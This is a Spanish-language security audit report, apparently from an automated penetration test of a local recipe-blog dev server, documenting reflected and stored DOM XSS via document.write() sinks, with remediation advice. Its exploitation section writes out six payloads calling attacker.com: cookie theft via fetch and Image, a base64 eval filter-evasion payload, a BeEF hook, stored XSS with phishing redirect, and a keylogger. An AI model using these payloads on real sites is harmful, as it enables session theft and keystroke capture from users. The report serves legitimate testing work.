# Informe de Auditoría de Seguridad — Cross-Site Scripting (XSS)

**Objetivo:** http://web.dev.local:8082  
**Fecha:** 2026-04-27T13:02:21Z  
**Auditor:** Penetration Tester (Kali Linux)  
**Clasificación:** CRÍTICO  

---

## Resumen Ejecutivo

Se identificaron y explotaron **dos vulnerabilidades de Cross-Site Scripting (XSS) basado en DOM** en la aplicación web objetivo. La primera es un **XSS Reflejado en DOM** a través del parámetro `search`, y la segunda es un **XSS Almacenado en DOM** a través de los parámetros `name` y `comment` del sistema de comentarios (usando `localStorage`). Ambas permiten la ejecución arbitraria de JavaScript en el contexto del navegador de la víctima, posibilitando robo de sesiones, defacement y compromiso total del cliente.

---

## 1. Reconocimiento

### 1.1 Análisis de la Aplicación

```bash
curl -s http://web.dev.local:8082/
```

**Resultados:**
- Aplicación: Blog de Recetas (Apache/2.4.65)
- Sin cabeceras de seguridad (`Content-Security-Policy`, `X-XSS-Protection`)
- Sin cookies de sesión con flag `HttpOnly` o `Secure`
- Formularios con método GET: `search`, `name`, `comment`

**Cabeceras HTTP relevantes:**
```
Server: Apache/2.4.65 (Unix)
Content-Type: text/html
(Sin CSP, sin X-Frame-Options, sin X-XSS-Protection)
```

### 1.2 Puntos de Entrada Identificados

| Parámetro | Método | Tipo de Sink | Riesgo |
|-----------|--------|-------------|--------|
| `search`  | GET    | `document.write()` | DOM XSS Reflejado |
| `name`    | GET    | `localStorage` → `document.write()` | DOM XSS Almacenado |
| `comment` | GET    | `localStorage` → `document.write()` | DOM XSS Almacenado |

---

## 2. Análisis de Vulnerabilidades

### 2.1 Código Vulnerable — Script 1 (Búsqueda)

```javascript
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');  // ← FUENTE no sanitizada

if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');  // ← SINK vulnerable
}
```

**Problema:** El valor de `searchTerm` proviene directamente de la URL sin ninguna sanitización (no se aplica `encodeHTML`, `textContent`, ni ninguna función de escape) y se inyecta directamente en `document.write()`.

### 2.2 Código Vulnerable — Script 2 (Comentarios)

```javascript
const name = urlParams.get('name');       // ← FUENTE no sanitizada
const comment = urlParams.get('comment'); // ← FUENTE no sanitizada

// Almacena en localStorage SIN sanitizar
comments.push({ name: name, comment: comment, date: ... });
localStorage.setItem('comments', JSON.stringify(comments));

// Luego renderiza directamente en document.write:
document.write('<div class="comment-author">' + c.name + '</div>');    // ← SINK
document.write('<div>' + c.comment + '</div>');                         // ← SINK
```

**Problema:** Los datos se almacenan en `localStorage` sin sanitización y se renderizan con `document.write()` a todos los visitantes posteriores → **XSS Almacenado**.

---

## 3. Confirmación de Vulnerabilidades (VULN_FOUND = true)

### 3.1 XSS Reflejado en DOM — Payload Básico

**Herramienta:** `curl` + análisis manual de JS

```bash
# Payload básico
curl -s "http://web.dev.local:8082/?search=%3C/strong%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"
```

**Resultado en el navegador — HTML generado:**
```html
<p>Resultados para: <strong></strong><img src=x onerror=alert(1)></strong></p>
```
→ El evento `onerror` se dispara al fallar la carga de la imagen, ejecutando `alert(1)`.

**URL de prueba:**
```
http://web.dev.local:8082/?search=%3C/strong%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
```

---

## 4. Explotación Activa (VULN_EXPLOITED = true)

### 4.1 Exploit #1 — Robo de Cookies/Sesión via `fetch()`

```bash
# Payload de robo de sesión
PAYLOAD='</strong><script>fetch("http://attacker.com/steal?c="+encodeURIComponent(document.cookie))</script>'
curl -s "http://web.dev.local:8082/?search=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")"
```

**URL del exploit:**
```
http://web.dev.local:8082/?search=%3C%2Fstrong%3E%3Cscript%3Efetch%28%22http%3A%2F%2Fattacker.com%2Fsteal%3Fc%3D%22%2BencodeURIComponent%28document.cookie%29%29%3C%2Fscript%3E
```

**HTML inyectado:**
```html
<p>Resultados para: <strong></strong>
<script>fetch("http://attacker.com/steal?c="+encodeURIComponent(document.cookie))</script>
</strong></p>
```

**Impacto:** Las cookies de sesión de la víctima son enviadas al servidor del atacante.

---

### 4.2 Exploit #2 — Robo de Cookies via `Image()` (Bypass de restricciones de CSP fetch)

```bash
PAYLOAD='</strong><img src=x onerror="new Image().src='"'"'http://attacker.com/steal?c='"'"'+document.cookie">'
```

**URL:**
```
http://web.dev.local:8082/?search=%3C%2Fstrong%3E%3Cimg%20src%3Dx%20onerror%3D%22new%20Image%28%29.src%3D%27http%3A%2F%2Fattacker.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%22%3E
```

**HTML inyectado:**
```html
<img src=x onerror="new Image().src='http://attacker.com/steal?c='+document.cookie">
```

---

### 4.3 Exploit #3 — Payload Ofuscado (Base64/eval — Evasión de WAF)

**Payload original:** `alert(document.cookie)`  
**Codificado en Base64:** `YWxlcnQoZG9jdW1lbnQuY29va2llKQ==`

```bash
PAYLOAD='</strong><img src=x onerror=eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))>'
```

**URL:**
```
http://web.dev.local:8082/?search=%3C%2Fstrong%3E%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%22YWxlcnQoZG9jdW1lbnQuY29va2llKQ%3D%3D%22%29%29%3E
```

**Técnica:** `eval(atob(...))` decodifica y ejecuta JavaScript codificado en Base64, evadiendo filtros basados en palabras clave como `alert` o `cookie`.

---

### 4.4 Exploit #4 — Hook de BeEF (Browser Exploitation Framework)

```bash
PAYLOAD='</strong><script src="http://attacker.com:3000/hook.js"></script>'
```

**URL:**
```
http://web.dev.local:8082/?search=%3C%2Fstrong%3E%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%3A3000%2Fhook.js%22%3E%3C%2Fscript%3E
```

**Impacto:** El navegador de la víctima carga el hook de BeEF, concediendo al atacante control total del navegador: keylogging, robo de credenciales, screenshots, pivoting de red interna, etc.

---

### 4.5 Exploit #5 — XSS Almacenado (Stored XSS — Impacto en TODOS los visitantes)

```bash
# Paso 1: Inyectar payload malicioso en el sistema de comentarios
curl -s "http://web.dev.local:8082/?name=%3Cimg%20src%3Dx%20onerror%3Dfetch%28%22http%3A%2F%2Fattacker.com%2Fsteal%3Fcookies%3D%22%2Bdocument.cookie%29%3E&comment=%3Cscript%3Edocument.location%3D%22http%3A%2F%2Fattacker.com%2Fphish%3Fsession%3D%22%2Bdocument.cookie%3C%2Fscript%3E"
```

**Mecanismo:**
1. El payload se almacena en `localStorage` del navegador
2. Al visitar `http://web.dev.local:8082/`, el script `displayComments()` renderiza:
   ```html
   <div class="comment-author">
     <img src=x onerror=fetch("http://attacker.com/steal?cookies="+document.cookie)>
   </div>
   <div>
     <script>document.location="http://attacker.com/phish?session="+document.cookie</script>
   </div>
   ```
3. **Todos los visitantes** que accedan a la página ejecutarán el payload.

**Impacto:** Robo masivo de cookies de sesión + redireccionamiento a sitio de phishing.

---

### 4.6 Exploit #6 — Keylogger via XSS

```bash
PAYLOAD='</strong><script>document.onkeypress=function(e){new Image().src="http://attacker.com/keys?k="+e.key}</script>'
```

**URL:**
```
http://web.dev.local:8082/?search=%3C%2Fstrong%3E%3Cscript%3Edocument.onkeypress%3Dfunction%28e%29%7Bnew%20Image%28%29.src%3D%22http%3A%2F%2Fattacker.com%2Fkeys%3Fk%3D%22%2Be.key%7D%3C%2Fscript%3E
```

**Impacto:** Captura cada tecla pulsada por la víctima en la página (contraseñas, datos de formularios).

---

## 5. Resumen de Vulnerabilidades

| ID | Tipo | Parámetro | Severidad | CVSS v3 (Est.) |
|----|------|-----------|-----------|----------------|
| XSS-01 | DOM XSS Reflejado | `search` | **ALTA** | 7.4 |
| XSS-02 | DOM XSS Almacenado | `name`, `comment` | **CRÍTICA** | 9.0 |

---

## 6. Impacto Real

- **Robo de sesión:** Extracción de `document.cookie` y `localStorage` con datos sensibles
- **Compromiso del cliente:** Hook BeEF para control total del navegador víctima
- **Phishing:** Redirección a páginas maliciosas con apariencia legítima
- **Keylogging:** Captura de credenciales escritas en la página
- **Defacement:** Modificación del contenido visible de la página
- **Propagación:** El XSS almacenado afecta a TODOS los visitantes (worm potencial)

---

## 7. Recomendaciones

1. **Sanitización de entradas:** Usar `DOMPurify` o `textContent` en lugar de concatenación en `document.write()`:
   ```javascript
   // Vulnerable:
   document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
   
   // Seguro:
   const p = document.createElement('p');
   p.textContent = 'Resultados para: ' + searchTerm;
   document.querySelector('.result').appendChild(p);
   ```

2. **Eliminar `document.write()`:** Reemplazar con `innerHTML` + DOMPurify o manipulación segura del DOM.

3. **CSP (Content Security Policy):** Implementar cabecera para bloquear scripts externos:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```

4. **Validación en servidor:** Aunque es DOM XSS, agregar validación y escape del lado del servidor como capa adicional.

5. **HttpOnly en cookies:** Marcar cookies de sesión con `HttpOnly` para mitigar el robo via `document.cookie`.

---

## 8. Conclusiones

**VULN_FOUND: true**  
**VULN_EXPLOITED: true**

La aplicación `http://web.dev.local:8082` presenta vulnerabilidades críticas de XSS basado en DOM. La ausencia total de sanitización en los sinks `document.write()` permite la inyección de HTML/JavaScript arbitrario. El XSS almacenado a través del sistema de comentarios representa el mayor riesgo, ya que afecta a todos los visitantes del sitio. Se ha demostrado la viabilidad del robo de sesiones, keylogging, hook de BeEF y redirección a phishing.

---

*Informe generado: 2026-04-27T13:02:21Z*
